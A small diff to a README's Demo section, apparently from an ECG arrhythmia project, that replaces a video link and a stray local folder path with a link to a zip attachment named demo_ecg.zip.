@@ -18,8 +18,7 @@
 ---
 
 ## 🎬 Demo
-https://github.com/rufuspitta-ux/ecg-arrhythmia/assets/ecg_mp4.mp4
-C:\Users\Lenovo
+[demo_ecg.zip](https://github.com/user-attachments/files/27163326/demo_ecg.zip)
 
 ---
 
